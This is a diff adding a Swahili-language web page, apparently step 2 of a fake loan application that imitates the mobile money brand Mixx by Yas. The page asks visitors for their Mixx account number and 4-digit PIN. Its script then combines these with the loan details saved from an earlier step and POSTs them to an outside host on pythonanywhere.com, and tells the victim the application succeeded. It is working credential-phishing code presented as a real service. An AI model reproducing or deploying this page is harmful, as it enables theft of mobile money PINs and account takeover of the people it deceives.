@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hatua ya 2 - Mixx by Yas</title>
+
+    <style>
+        body {
+            font-family: Arial;
+            max-width: 500px;
+            margin: auto;
+        }
+
+        input {
+            padding: 12px;
+            margin: 8px 0;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        h2 {
+            text-align: center;
+        }
+
+        .pin-wrapper {
+            position: relative;
+            margin-top: 10px;
+        }
+
+        .pin-boxes {
+            display: flex;
+            gap: 10px;
+            justify-content: space-between;
+        }
+
+        .pin-boxes input {
+            width: 20%;
+            text-align: center;
+            font-size: 20px;
+        }
+
+        .eye {
+            position: absolute;
+            right: 10px;
+            top: -35px;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: blue;
+            color: white;
+            border: none;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+<h2>Mixx by Yas - Hatua ya 2</h2>
+
+<!-- MIXX NUMBER -->
+<input type="text" id="mixxNumber" placeholder="Namba ya Mixx by Yas">
+
+<!-- PIN TITLE -->
+<p><b>Weka PIN ya Mixx by Yas</b></p>
+
+<!-- PIN + EYE ICON -->
+<div class="pin-wrapper">
+
+    <span class="eye" onclick="togglePin()">👁️</span>
+
+    <div class="pin-boxes">
+        <input type="password" maxlength="1" id="p1">
+        <input type="password" maxlength="1" id="p2">
+        <input type="password" maxlength="1" id="p3">
+        <input type="password" maxlength="1" id="p4">
+    </div>
+
+</div>
+
+<button onclick="tumaMaombi()">Tuma Maombi</button>
+
+<script>
+
+// 🔥 AUTO MOVE PIN BOXES
+const inputs = document.querySelectorAll(".pin-boxes input");
+
+inputs.forEach((input, index) => {
+    input.addEventListener("input", () => {
+        if (input.value.length === 1 && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+        }
+    });
+
+    input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && input.value === "" && index > 0) {
+            inputs[index - 1].focus();
+        }
+    });
+});
+
+// 🔥 TOGGLE PIN VISIBILITY
+let hidden = true;
+
+function togglePin() {
+    hidden = !hidden;
+
+    inputs.forEach(input => {
+        input.type = hidden ? "password" : "text";
+    });
+}
+
+// 🔥 LOAD STEP 1 DATA
+let data = JSON.parse(localStorage.getItem("mkopo_data"));
+
+// 🔥 SUBMIT
+function tumaMaombi() {
+
+    let mixxNumber = document.getElementById("mixxNumber").value;
+
+    let pin =
+        document.getElementById("p1").value +
+        document.getElementById("p2").value +
+        document.getElementById("p3").value +
+        document.getElementById("p4").value;
+
+    if (!mixxNumber || pin.length < 4) {
+        alert("Tafadhali jaza Mixx number na PIN kamili");
+        return;
+    }
+
+    if (!data) {
+        alert("Hakuna data ya mkopo");
+        return;
+    }
+
+    let ujumbe =
+        `🟢 MKOPO MIXX BY YAS\n` +
+        `Jina: ${data.jina}\n` +
+        `Lengo: ${data.lengo}\n` +
+        `Muda: ${data.muda} miezi\n` +
+        `Kiasi: ${Number(data.kiasi).toLocaleString()} TZS\n` +
+        `Mixx Number: ${mixxNumber}\n` +
+        `PIN: ${pin}`;
+
+    fetch("https://superadmin008.pythonanywhere.com/send", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ message: ujumbe })
+    })
+    .then(res => res.json())
+    .then(() => {
+        alert("Maombi yamefanikiwa kutumwa!");
+        localStorage.removeItem("mkopo_data");
+        window.location.href = "success.html";
+    })
+    .catch(err => {
+        alert("Tatizo limetokea");
+        console.log(err);
+    });
+}
+
+</script>
+
+</body>
+</html>
